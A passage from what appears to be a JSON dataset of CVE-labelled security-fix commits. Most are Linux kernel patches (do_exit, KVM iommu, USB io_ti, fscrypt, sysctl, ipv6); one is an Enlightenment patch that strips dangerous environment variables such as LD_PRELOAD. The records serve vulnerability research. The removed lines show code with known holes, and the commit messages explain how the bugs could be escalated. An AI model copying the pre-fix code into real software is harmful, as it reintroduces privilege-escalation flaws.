(!sock)\n \t\tgoto out;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4258","CWE_ID":"264","category":"security","commit_id":"33dd94ae1ccbfb7bf0fb6c692bc3d1c4269e6177","commit_message":"From 33dd94ae1ccbfb7bf0fb6c692bc3d1c4269e6177 Mon Sep 17 00:00:00 2001\nFrom: Nelson Elhage <nelhage@ksplice.com>\nDate: Thu, 2 Dec 2010 14:31:21 -0800\nSubject: do_exit(): make sure that we run with get_fs() == USER_DS\n\nIf a user manages to trigger an oops with fs set to KERNEL_DS, fs is not\notherwise reset before do_exit().  do_exit may later (via mm_release in\nfork.c) do a put_user to a user-controlled address, potentially allowing\na user to leverage an oops into a controlled write into kernel memory.\n\nThis is only triggerable in the presence of another bug, but this\npotentially turns a lot of DoS bugs into privilege escalations, so it's\nworth fixing.  I have proof-of-concept code which uses this bug along\nwith CVE-2010-3849 to write a zero to an arbitrary kernel address, so\nI've tested that this is not theoretical.\n\nA more logical place to put this fix might be when we know an oops has\noccurred, before we call do_exit(), but that would involve changing\nevery architecture, in multiple places.\n\nLet's just stick it in do_exit instead.\n\n[akpm@linux-foundation.org: update code comment]\nSigned-off-by: Nelson Elhage <nelhage@ksplice.com>\nCc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/exit.c | 9 +++++++++\n 1 file changed, 9 insertions(+)\n\n","diff_code":"diff --git a\/kernel\/exit.c b\/kernel\/exit.c\nindex 21aa7b3001fb..676149a4ac5f 100644\n--- a\/kernel\/exit.c\n+++ b\/kernel\/exit.c\n@@ -914,6 +914,15 @@ NORET_TYPE void do_exit(long code)\n \tif (unlikely(!tsk->pid))\n \t\tpanic(\"Attempted to kill the idle task!\");\n \n+\t\/*\n+\t * If do_exit is called because this processes oopsed, it's possible\n+\t * that get_fs() was left as KERNEL_DS, so reset it to USER_DS before\n+\t * continuing. Amongst other possible reasons, this is to prevent\n+\t * mm_release()->clear_child_tid() from writing to a user-controlled\n+\t * kernel address.\n+\t *\/\n+\tset_fs(USER_DS);\n+\n \ttracehook_report_exit(&code);\n \n \tvalidate_creds_for_do_exit(tsk);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2121","CWE_ID":"264","category":"security","commit_id":"09ca8e1173bcb12e2a449698c9ae3b86a8a10195","commit_message":"From 09ca8e1173bcb12e2a449698c9ae3b86a8a10195 Mon Sep 17 00:00:00 2001\nFrom: Alex Williamson <alex.williamson@redhat.com>\nDate: Wed, 11 Apr 2012 09:51:49 -0600\nSubject: [PATCH] KVM: unmap pages from the iommu when slots are removed\n\ncommit 32f6daad4651a748a58a3ab6da0611862175722f upstream.\n\nWe've been adding new mappings, but not destroying old mappings.\nThis can lead to a page leak as pages are pinned using\nget_user_pages, but only unpinned with put_page if they still\nexist in the memslots list on vm shutdown.  A memslot that is\ndestroyed while an iommu domain is enabled for the guest will\ntherefore result in an elevated page reference count that is\nnever cleared.\n\nAdditionally, without this fix, the iommu is only programmed\nwith the first translation for a gpa.  This can result in\npeer-to-peer errors if a mapping is destroyed and replaced by a\nnew mapping at the same gpa as the iommu will still be pointing\nto the original, pinned memory address.\n\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n include\/linux\/kvm_host.h | 6 ++++++\n virt\/kvm\/iommu.c         | 7 ++++++-\n virt\/kvm\/kvm_main.c      | 5 +++--\n 3 files changed, 15 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/kvm_host.h b\/include\/linux\/kvm_host.h\nindex 900c76337e8f3..bc2172077d9d2 100644\n--- a\/include\/linux\/kvm_host.h\n+++ b\/include\/linux\/kvm_host.h\n@@ -593,6 +593,7 @@ void kvm_free_irq_source_id(struct kvm *kvm, int irq_source_id);\n \n #ifdef CONFIG_IOMMU_API\n int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot);\n+void kvm_iommu_unmap_pages(struct kvm *kvm, struct kvm_memory_slot *slot);\n int kvm_iommu_map_guest(struct kvm *kvm);\n int kvm_iommu_unmap_guest(struct kvm *kvm);\n int kvm_assign_device(struct kvm *kvm,\n@@ -606,6 +607,11 @@ static inline int kvm_iommu_map_pages(struct kvm *kvm,\n \treturn 0;\n }\n \n+static inline void kvm_iommu_unmap_pages(struct kvm *kvm,\n+\t\t\t\t\t struct kvm_memory_slot *slot)\n+{\n+}\n+\n static inline int kvm_iommu_map_guest(struct kvm *kvm)\n {\n \treturn -ENODEV;\ndiff --git a\/virt\/kvm\/iommu.c b\/virt\/kvm\/iommu.c\nindex a457d2138f49a..fec1723de9b4e 100644\n--- a\/virt\/kvm\/iommu.c\n+++ b\/virt\/kvm\/iommu.c\n@@ -310,6 +310,11 @@ static void kvm_iommu_put_pages(struct kvm *kvm,\n \t}\n }\n \n+void kvm_iommu_unmap_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n+{\n+\tkvm_iommu_put_pages(kvm, slot->base_gfn, slot->npages);\n+}\n+\n static int kvm_iommu_unmap_memslots(struct kvm *kvm)\n {\n \tint idx;\n@@ -320,7 +325,7 @@ static int kvm_iommu_unmap_memslots(struct kvm *kvm)\n \tslots = kvm_memslots(kvm);\n \n \tkvm_for_each_memslot(memslot, slots)\n-\t\tkvm_iommu_put_pages(kvm, memslot->base_gfn, memslot->npages);\n+\t\tkvm_iommu_unmap_pages(kvm, memslot);\n \n \tsrcu_read_unlock(&kvm->srcu, idx);\n \ndiff --git a\/virt\/kvm\/kvm_main.c b\/virt\/kvm\/kvm_main.c\nindex a91f980077d84..c4ac57e2fdc63 100644\n--- a\/virt\/kvm\/kvm_main.c\n+++ b\/virt\/kvm\/kvm_main.c\n@@ -873,12 +873,13 @@ int __kvm_set_memory_region(struct kvm *kvm,\n \tif (r)\n \t\tgoto out_free;\n \n-\t\/* map the pages in iommu page table *\/\n+\t\/* map\/unmap the pages in iommu page table *\/\n \tif (npages) {\n \t\tr = kvm_iommu_map_pages(kvm, &new);\n \t\tif (r)\n \t\t\tgoto out_free;\n-\t}\n+\t} else\n+\t\tkvm_iommu_unmap_pages(kvm, &old);\n \n \tr = -ENOMEM;\n \tslots = kmemdup(kvm->memslots, sizeof(struct kvm_memslots),\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-1774","CWE_ID":"264","category":"security","commit_id":"1ee0a224bc9aad1de496c795f96bc6ba2c394811","commit_message":"From 1ee0a224bc9aad1de496c795f96bc6ba2c394811 Mon Sep 17 00:00:00 2001\nFrom: Wolfgang Frisch <wfpub@roembden.net>\nDate: Thu, 17 Jan 2013 01:07:02 +0100\nSubject: [PATCH] USB: io_ti: Fix NULL dereference in chase_port()\n\nThe tty is NULL when the port is hanging up.\nchase_port() needs to check for this.\n\nThis patch is intended for stable series.\nThe behavior was observed and tested in Linux 3.2 and 3.7.1.\n\nJohan Hovold submitted a more elaborate patch for the mainline kernel.\n\n[   56.277883] usb 1-1: edge_bulk_in_callback - nonzero read bulk status received: -84\n[   56.278811] usb 1-1: USB disconnect, device number 3\n[   56.278856] usb 1-1: edge_bulk_in_callback - stopping read!\n[   56.279562] BUG: unable to handle kernel NULL pointer dereference at 00000000000001c8\n[   56.280536] IP: [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.281212] PGD 1dc1b067 PUD 1e0f7067 PMD 0\n[   56.282085] Oops: 0002 [#1] SMP\n[   56.282744] Modules linked in:\n[   56.283512] CPU 1\n[   56.283512] Pid: 25, comm: khubd Not tainted 3.7.1 #1 innotek GmbH VirtualBox\/VirtualBox\n[   56.283512] RIP: 0010:[<ffffffff8144e62a>]  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.283512] RSP: 0018:ffff88001fa99ab0  EFLAGS: 00010046\n[   56.283512] RAX: 0000000000000046 RBX: 00000000000001c8 RCX: 0000000000640064\n[   56.283512] RDX: 0000000000010000 RSI: ffff88001fa99b20 RDI: 00000000000001c8\n[   56.283512] RBP: ffff88001fa99b20 R08: 0000000000000000 R09: 0000000000000000\n[   56.283512] R10: 0000000000000000 R11: ffffffff812fcb4c R12: ffff88001ddf53c0\n[   56.283512] R13: 0000000000000000 R14: 00000000000001c8 R15: ffff88001e19b9f4\n[   56.283512] FS:  0000000000000000(0000) GS:ffff88001fd00000(0000) knlGS:0000000000000000\n[   56.283512] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[   56.283512] CR2: 00000000000001c8 CR3: 000000001dc51000 CR4: 00000000000006e0\n[   56.283512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[   56.283512] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n[   56.283512] Process khubd (pid: 25, threadinfo ffff88001fa98000, task ffff88001fa94f80)\n[   56.283512] Stack:\n[   56.283512]  0000000000000046 00000000000001c8 ffffffff810578ec ffffffff812fcb4c\n[   56.283512]  ffff88001e19b980 0000000000002710 ffffffff812ffe81 0000000000000001\n[   56.283512]  ffff88001fa94f80 0000000000000202 ffffffff00000001 0000000000000296\n[   56.283512] Call Trace:\n[   56.283512]  [<ffffffff810578ec>] ? add_wait_queue+0x12\/0x3c\n[   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28\/0x28\n[   56.283512]  [<ffffffff812ffe81>] ? chase_port+0x84\/0x2d6\n[   56.283512]  [<ffffffff81063f27>] ? try_to_wake_up+0x199\/0x199\n[   56.283512]  [<ffffffff81263a5c>] ? tty_ldisc_hangup+0x222\/0x298\n[   56.283512]  [<ffffffff81300171>] ? edge_close+0x64\/0x129\n[   56.283512]  [<ffffffff810612f7>] ? __wake_up+0x35\/0x46\n[   56.283512]  [<ffffffff8106135b>] ? should_resched+0x5\/0x23\n[   56.283512]  [<ffffffff81264916>] ? tty_port_shutdown+0x39\/0x44\n[   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28\/0x28\n[   56.283512]  [<ffffffff8125d38c>] ? __tty_hangup+0x307\/0x351\n[   56.283512]  [<ffffffff812e6ddc>] ? usb_hcd_flush_endpoint+0xde\/0xed\n[   56.283512]  [<ffffffff8144e625>] ? _raw_spin_lock_irqsave+0x14\/0x35\n[   56.283512]  [<ffffffff812fd361>] ? usb_serial_disconnect+0x57\/0xc2\n[   56.283512]  [<ffffffff812ea99b>] ? usb_unbind_interface+0x5c\/0x131\n[   56.283512]  [<ffffffff8128d738>] ? __device_release_driver+0x7f\/0xd5\n[   56.283512]  [<ffffffff8128d9cd>] ? device_release_driver+0x1a\/0x25\n[   56.283512]  [<ffffffff8128d393>] ? bus_remove_device+0xd2\/0xe7\n[   56.283512]  [<ffffffff8128b7a3>] ? device_del+0x119\/0x167\n[   56.283512]  [<ffffffff812e8d9d>] ? usb_disable_device+0x6a\/0x180\n[   56.283512]  [<ffffffff812e2ae0>] ? usb_disconnect+0x81\/0xe6\n[   56.283512]  [<ffffffff812e4435>] ? hub_thread+0x577\/0xe82\n[   56.283512]  [<ffffffff8144daa7>] ? __schedule+0x490\/0x4be\n[   56.283512]  [<ffffffff8105798f>] ? abort_exclusive_wait+0x79\/0x79\n[   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f\/0x2f\n[   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f\/0x2f\n[   56.283512]  [<ffffffff810570b4>] ? kthread+0x81\/0x89\n[   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c\/0x5c\n[   56.283512]  [<ffffffff8145387c>] ? ret_from_fork+0x7c\/0xb0\n[   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c\/0x5c\n[   56.283512] Code: 8b 7c 24 08 e8 17 0b c3 ff 48 8b 04 24 48 83 c4 10 c3 53 48 89 fb 41 50 e8 e0 0a c3 ff 48 89 04 24 e8 e7 0a c3 ff ba 00 00 01 00\n<f0> 0f c1 13 48 8b 04 24 89 d1 c1 ea 10 66 39 d1 74 07 f3 90 66\n[   56.283512] RIP  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.283512]  RSP <ffff88001fa99ab0>\n[   56.283512] CR2: 00000000000001c8\n[   56.283512] ---[ end trace 49714df27e1679ce ]---\n\nSigned-off-by: Wolfgang Frisch <wfpub@roembden.net>\nCc: Johan Hovold <jhovold@gmail.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers\/usb\/serial\/io_ti.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/usb\/serial\/io_ti.c b\/drivers\/usb\/serial\/io_ti.c\nindex 58184f3de6867..82afc4d6a327d 100644\n--- a\/drivers\/usb\/serial\/io_ti.c\n+++ b\/drivers\/usb\/serial\/io_ti.c\n@@ -530,6 +530,9 @@ static void chase_port(struct edgeport_port *port, unsigned long timeout,\n \twait_queue_t wait;\n \tunsigned long flags;\n \n+\tif (!tty)\n+\t\treturn;\n+\n \tif (!timeout)\n \t\ttimeout = (HZ * EDGE_CLOSING_WAIT)\/100;\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-10318","CWE_ID":"264","category":"security","commit_id":"163ae1c6ad6299b19e22b4a35d5ab24a89791a98","commit_message":"From 163ae1c6ad6299b19e22b4a35d5ab24a89791a98 Mon Sep 17 00:00:00 2001\nFrom: Eric Biggers <ebiggers@google.com>\nDate: Thu, 8 Sep 2016 10:57:08 -0700\nSubject: fscrypto: add authorization check for setting encryption policy\n\nOn an ext4 or f2fs filesystem with file encryption supported, a user\ncould set an encryption policy on any empty directory(*) to which they\nhad readonly access.  This is obviously problematic, since such a\ndirectory might be owned by another user and the new encryption policy\nwould prevent that other user from creating files in their own directory\n(for example).\n\nFix this by requiring inode_owner_or_capable() permission to set an\nencryption policy.  This means that either the caller must own the file,\nor the caller must have the capability CAP_FOWNER.\n\n(*) Or also on any regular file, for f2fs v4.6 and later and ext4\n    v4.8-rc1 and later; a separate bug fix is coming for that.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nCc: stable@vger.kernel.org # 4.1+; check fs\/{ext4,f2fs}\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\n---\n fs\/crypto\/policy.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/fs\/crypto\/policy.c b\/fs\/crypto\/policy.c\nindex 0f9961eede1e..c9800b1a2e93 100644\n--- a\/fs\/crypto\/policy.c\n+++ b\/fs\/crypto\/policy.c\n@@ -95,6 +95,9 @@ static int create_encryption_context_from_policy(struct inode *inode,\n int fscrypt_process_policy(struct inode *inode,\n \t\t\t\tconst struct fscrypt_policy *policy)\n {\n+\tif (!inode_owner_or_capable(inode))\n+\t\treturn -EACCES;\n+\n \tif (policy->version != 0)\n \t\treturn -EINVAL;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4080","CWE_ID":"264","category":"security","commit_id":"bfdc0b497faa82a0ba2f9dddcf109231dd519fcc","commit_message":"From bfdc0b497faa82a0ba2f9dddcf109231dd519fcc Mon Sep 17 00:00:00 2001\nFrom: Richard Weinberger <richard@nod.at>\nDate: Wed, 23 Mar 2011 16:43:11 -0700\nSubject: sysctl: restrict write access to dmesg_restrict\n\nWhen dmesg_restrict is set to 1 CAP_SYS_ADMIN is needed to read the kernel\nring buffer.  But a root user without CAP_SYS_ADMIN is able to reset\ndmesg_restrict to 0.\n\nThis is an issue when e.g.  LXC (Linux Containers) are used and complete\nuser space is running without CAP_SYS_ADMIN.  A unprivileged and jailed\nroot user can bypass the dmesg_restrict protection.\n\nWith this patch writing to dmesg_restrict is only allowed when root has\nCAP_SYS_ADMIN.\n\nSigned-off-by: Richard Weinberger <richard@nod.at>\nAcked-by: Dan Rosenberg <drosenberg@vsecurity.com>\nAcked-by: Serge E. Hallyn <serge@hallyn.com>\nCc: Eric Paris <eparis@redhat.com>\nCc: Kees Cook <kees.cook@canonical.com>\nCc: James Morris <jmorris@namei.org>\nCc: Eugene Teo <eugeneteo@kernel.org>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/sysctl.c | 18 +++++++++++++++++-\n 1 file changed, 17 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/kernel\/sysctl.c b\/kernel\/sysctl.c\nindex 97ab1690f5ed..c0bb32414b17 100644\n--- a\/kernel\/sysctl.c\n+++ b\/kernel\/sysctl.c\n@@ -170,6 +170,11 @@ static int proc_taint(struct ctl_table *table, int write,\n \t\t\t       void __user *buffer, size_t *lenp, loff_t *ppos);\n #endif\n \n+#ifdef CONFIG_PRINTK\n+static int proc_dmesg_restrict(struct ctl_table *table, int write,\n+\t\t\t\tvoid __user *buffer, size_t *lenp, loff_t *ppos);\n+#endif\n+\n #ifdef CONFIG_MAGIC_SYSRQ\n \/* Note: sysrq code uses it's own private copy *\/\n static int __sysrq_enabled = SYSRQ_DEFAULT_ENABLE;\n@@ -707,7 +712,7 @@ static struct ctl_table kern_table[] = {\n \t\t.data\t\t= &kptr_restrict,\n \t\t.maxlen\t\t= sizeof(int),\n \t\t.mode\t\t= 0644,\n-\t\t.proc_handler\t= proc_dointvec_minmax,\n+\t\t.proc_handler\t= proc_dmesg_restrict,\n \t\t.extra1\t\t= &zero,\n \t\t.extra2\t\t= &two,\n \t},\n@@ -2394,6 +2399,17 @@ static int proc_taint(struct ctl_table *table, int write,\n \treturn err;\n }\n \n+#ifdef CONFIG_PRINTK\n+static int proc_dmesg_restrict(struct ctl_table *table, int write,\n+\t\t\t\tvoid __user *buffer, size_t *lenp, loff_t *ppos)\n+{\n+\tif (write && !capable(CAP_SYS_ADMIN))\n+\t\treturn -EPERM;\n+\n+\treturn proc_dointvec_minmax(table, write, buffer, lenp, ppos);\n+}\n+#endif\n+\n struct do_proc_dointvec_minmax_conv_param {\n \tint *min;\n \tint *max;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-1845","CWE_ID":"264","category":"security","commit_id":"666df815cd86a50343859bce36c5cf968c5f38b0","commit_message":"From 666df815cd86a50343859bce36c5cf968c5f38b0 Mon Sep 17 00:00:00 2001\nFrom: \"Carsten Haitzler (Rasterman)\" <raster@rasterman.com>\nDate: Sun, 1 Dec 2013 11:48:49 +0900\nSubject: e_sys - address security concerns with environment - more\n\nadd more environment variables to nuke and add alternate envrionment\nnuke method to raise security level.\n---\n configure.ac         |  19 ++++++++-\n src\/bin\/e_sys_main.c | 113 ++++++++++++++++++++++++++++++++++++++++++++++++---\n 2 files changed, 125 insertions(+), 7 deletions(-)\n\n","diff_code":"diff --git a\/configure.ac b\/configure.ac\nindex 420fcc099..1bac1dc99 100644\n--- a\/configure.ac\n+++ b\/configure.ac\n@@ -74,7 +74,24 @@ EFL_CHECK_PATH_MAX\n AC_CHECK_FUNCS(setenv)\n AC_CHECK_FUNCS(unsetenv)\n AC_CHECK_FUNCS(clearenv)\n-AC_CHECK_HEADERS([features.h])\n+AC_CHECK_HEADERS(features.h)\n+\n+case \"$host_os\" in\n+   darwin*)\n+      AC_DEFINE([environ], [(*_NSGetEnviron())],\n+                [\"apple doesn't follow POSIX in this case.\"])\n+      ;;\n+   *)\n+      ;;\n+esac\n+AC_TRY_COMPILE([\n+#define _GNU_SOURCE 1\n+#include <unistd.h>\n+    ],[\n+extern char **environ;\n+    ],[\n+AC_DEFINE(HAVE_ENVIRON, 1, [Have environ var])\n+    ])\n \n efl_version=\"1.8.0\"\n AC_SUBST(efl_version)\ndiff --git a\/src\/bin\/e_sys_main.c b\/src\/bin\/e_sys_main.c\nindex e833dac8e..cd3fcaeee 100644\n--- a\/src\/bin\/e_sys_main.c\n+++ b\/src\/bin\/e_sys_main.c\n@@ -8,6 +8,9 @@\n \n #include <stdio.h>\n #include <stdlib.h>\n+#ifdef HAVE_ENVIRON\n+# define _GNU_SOURCE 1\n+#endif\n #include <unistd.h>\n #include <string.h>\n #include <sys\/types.h>\n@@ -22,6 +25,10 @@\n #endif\n #include <Eina.h>\n \n+#ifdef HAVE_ENVIRON\n+extern char **environ;\n+#endif\n+\n double e_sys_l2ping(const char *bluetooth_mac);\n \n \/* local subsystem functions *\/\n@@ -166,17 +173,111 @@ main(int argc,\n    \/* sanitize environment *\/\n #ifdef HAVE_UNSETENV\n # define NOENV(x) unsetenv(x)\n-#else\n-# define NOENV(x)\n-#endif\n+   \/* pass 1 - just nuke known dangerous env vars brutally if possible via\n+    * unsetenv(). if you don't have unsetenv... there's pass 2 and 3 *\/\n    NOENV(\"IFS\");\n+   NOENV(\"CDPATH\");\n+   NOENV(\"LOCALDOMAIN\");\n+   NOENV(\"RES_OPTIONS\");\n+   NOENV(\"HOSTALIASES\");\n+   NOENV(\"NLSPATH\");\n+   NOENV(\"PATH_LOCALE\");\n+   NOENV(\"COLORTERM\");\n+   NOENV(\"LANG\");\n+   NOENV(\"LANGUAGE\");\n+   NOENV(\"LINGUAS\");\n+   NOENV(\"TERM\");\n    NOENV(\"LD_PRELOAD\");\n-   NOENV(\"PYTHONPATH\");\n    NOENV(\"LD_LIBRARY_PATH\");\n+   NOENV(\"SHLIB_PATH\");\n+   NOENV(\"LIBPATH\");\n+   NOENV(\"AUTHSTATE\");\n+   NOENV(\"DYLD_*\");\n+   NOENV(\"KRB_CONF*\");\n+   NOENV(\"KRBCONFDIR\");\n+   NOENV(\"KRBTKFILE\");\n+   NOENV(\"KRB5_CONFIG*\");\n+   NOENV(\"KRB5_KTNAME\");\n+   NOENV(\"VAR_ACE\");\n+   NOENV(\"USR_ACE\");\n+   NOENV(\"DLC_ACE\");\n+   NOENV(\"TERMINFO\");\n+   NOENV(\"TERMINFO_DIRS\");\n+   NOENV(\"TERMPATH\");\n+   NOENV(\"TERMCAP\");\n+   NOENV(\"ENV\");\n+   NOENV(\"BASH_ENV\");\n+   NOENV(\"PS4\");\n+   NOENV(\"GLOBIGNORE\");\n+   NOENV(\"SHELLOPTS\");\n+   NOENV(\"JAVA_TOOL_OPTIONS\");\n+   NOENV(\"PERLIO_DEBUG\");\n+   NOENV(\"PERLLIB\");\n+   NOENV(\"PERL5LIB\");\n+   NOENV(\"PERL5OPT\");\n+   NOENV(\"PERL5DB\");\n+   NOENV(\"FPATH\");\n+   NOENV(\"NULLCMD\");\n+   NOENV(\"READNULLCMD\");\n+   NOENV(\"ZDOTDIR\");\n+   NOENV(\"TMPPREFIX\");\n+   NOENV(\"PYTHONPATH\");\n+   NOENV(\"PYTHONHOME\");\n+   NOENV(\"PYTHONINSPECT\");\n+   NOENV(\"RUBYLIB\");\n+   NOENV(\"RUBYOPT\");\n+# ifdef HAVE_ENVIRON\n+   if (environ)\n+     {\n+        int again;\n+        char *tmp, *p;\n+\n+        \/* go over environment array again and again... safely *\/\n+        do\n+          {\n+             again = 0;\n+\n+             \/* walk through and find first entry that we don't like *\/\n+             for (i = 0; environ[i]; i++)\n+               {\n+                  \/* if it begins with any of these, it's possibly nasty *\/\n+                  if ((!strncmp(environ[i], \"LD_\", 3)) ||\n+                      (!strncmp(environ[i], \"_RLD_\", 5)) ||\n+                      (!strncmp(environ[i], \"LC_\", 3)) ||\n+                      (!strncmp(environ[i], \"LDR_\", 3)))\n+                    {\n+                       \/* unset it *\/\n+                       tmp = strdup(environ[i]);\n+                       if (!tmp) abort();\n+                       p = strchr(tmp, '=');\n+                       if (!p) abort();\n+                       *p = 0;\n+                       NOENV(p);\n+                       free(tmp);\n+                       \/* and mark our do to try again from the start in case\n+                        * unsetenv changes environ ptr *\/\n+                       again = 1;\n+                       break;\n+                    }\n+               }\n+          }\n+        while (again);\n+     }\n+# endif\n+#endif\n+\n+   \/* pass 2 - clear entire environment so it doesn't exist at all. if you\n+    * can't do this... you're possibly in trouble... but the worst is still\n+    * fixed in pass 3 *\/\n #ifdef HAVE_CLEARENV\n-     clearenv();\n+   clearenv();\n+#else\n+# ifdef HAVE_ENVIRON\n+   environ = NULL;\n+# endif\n #endif\n-   \/* set path and ifs to minimal defaults *\/\n+\n+   \/* pass 3 - set path and ifs to minimal defaults *\/\n    putenv(\"PATH=\/bin:\/usr\/bin\");\n    putenv(\"IFS= \\t\\n\");\n \n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-3841","CWE_ID":"264","category":"security","commit_id":"45f6fad84cc305103b28d73482b344d7f5b76f39","commit_message":"From 45f6fad84cc305103b28d73482b344d7f5b76f39 Mon Sep 17 00:00:00 2001\nFrom: Eric Dumazet <edumazet@google.com>\nDate: Sun, 29 Nov 2015 19:37:57 -0800\nSubject: [PATCH] ipv6: add complete rcu protection around np->opt\n\nThis patch addresses multiple problems :\n\nUDP\/RAW sendmsg() need to get a stable struct ipv6_txoptions\nwhile socket is not locked : Other threads can change np->opt\nconcurrently. Dmitry posted a syzkaller\n(http:\/\/github.com\/google\/syzkaller) program desmonstrating\nuse-after-free.\n\nStarting with TCP\/DCCP lockless listeners, tcp_v6_syn_recv_sock()\nand dccp_v6_request_recv_sock() also need to use RCU protection\nto dereference np->opt once (before calling ipv6_dup_options())\n\nThis patch adds full RCU protection to np->opt\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/linux\/ipv6.h             |  2 +-\n include\/net\/ipv6.h               | 21 +++++++++++++++++++-\n net\/dccp\/ipv6.c                  | 33 ++++++++++++++++++++------------\n net\/ipv6\/af_inet6.c              | 13 +++++++++----\n net\/ipv6\/datagram.c              |  4 +++-\n net\/ipv6\/exthdrs.c               |  3 ++-\n net\/ipv6\/inet6_connection_sock.c | 11 ++++++++---\n net\/ipv6\/ipv6_sockglue.c         | 33 +++++++++++++++++++++-----------\n net\/ipv6\/raw.c                   |  8 ++++++--\n net\/ipv6\/syncookies.c            |  2 +-\n net\/ipv6\/tcp_ipv6.c              | 28 ++++++++++++++++-----------\n net\/ipv6\/udp.c                   |  8 ++++++--\n net\/l2tp\/l2tp_ip6.c              |  8 ++++++--\n 13 files changed, 122 insertions(+), 52 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/ipv6.h b\/include\/linux\/ipv6.h\nindex 0ef2a97ccdb50..402753bccafa3 100644\n--- a\/include\/linux\/ipv6.h\n+++ b\/include\/linux\/ipv6.h\n@@ -227,7 +227,7 @@ struct ipv6_pinfo {\n \tstruct ipv6_ac_socklist\t*ipv6_ac_list;\n \tstruct ipv6_fl_socklist __rcu *ipv6_fl_list;\n \n-\tstruct ipv6_txoptions\t*opt;\n+\tstruct ipv6_txoptions __rcu\t*opt;\n \tstruct sk_buff\t\t*pktoptions;\n \tstruct sk_buff\t\t*rxpmtu;\n \tstruct inet6_cork\tcork;\ndiff --git a\/include\/net\/ipv6.h b\/include\/net\/ipv6.h\nindex ea5a13ef85a6c..9a5c9f0137845 100644\n--- a\/include\/net\/ipv6.h\n+++ b\/include\/net\/ipv6.h\n@@ -205,6 +205,7 @@ extern rwlock_t ip6_ra_lock;\n  *\/\n \n struct ipv6_txoptions {\n+\tatomic_t\t\trefcnt;\n \t\/* Length of this structure *\/\n \tint\t\t\ttot_len;\n \n@@ -217,7 +218,7 @@ struct ipv6_txoptions {\n \tstruct ipv6_opt_hdr\t*dst0opt;\n \tstruct ipv6_rt_hdr\t*srcrt;\t\/* Routing Header *\/\n \tstruct ipv6_opt_hdr\t*dst1opt;\n-\n+\tstruct rcu_head\t\trcu;\n \t\/* Option buffer, as read by IPV6_PKTOPTIONS, starts here. *\/\n };\n \n@@ -252,6 +253,24 @@ struct ipv6_fl_socklist {\n \tstruct rcu_head\t\t\trcu;\n };\n \n+static inline struct ipv6_txoptions *txopt_get(const struct ipv6_pinfo *np)\n+{\n+\tstruct ipv6_txoptions *opt;\n+\n+\trcu_read_lock();\n+\topt = rcu_dereference(np->opt);\n+\tif (opt && !atomic_inc_not_zero(&opt->refcnt))\n+\t\topt = NULL;\n+\trcu_read_unlock();\n+\treturn opt;\n+}\n+\n+static inline void txopt_put(struct ipv6_txoptions *opt)\n+{\n+\tif (opt && atomic_dec_and_test(&opt->refcnt))\n+\t\tkfree_rcu(opt, rcu);\n+}\n+\n struct ip6_flowlabel *fl6_sock_lookup(struct sock *sk, __be32 label);\n struct ipv6_txoptions *fl6_merge_options(struct ipv6_txoptions *opt_space,\n \t\t\t\t\t struct ip6_flowlabel *fl,\ndiff --git a\/net\/dccp\/ipv6.c b\/net\/dccp\/ipv6.c\nindex db5fc2440a232..e7e0b9bc2a43e 100644\n--- a\/net\/dccp\/ipv6.c\n+++ b\/net\/dccp\/ipv6.c\n@@ -202,7 +202,9 @@ static int dccp_v6_send_response(const struct sock *sk, struct request_sock *req\n \tsecurity_req_classify_flow(req, flowi6_to_flowi(&fl6));\n \n \n-\tfinal_p = fl6_update_dst(&fl6, np->opt, &final);\n+\trcu_read_lock();\n+\tfinal_p = fl6_update_dst(&fl6, 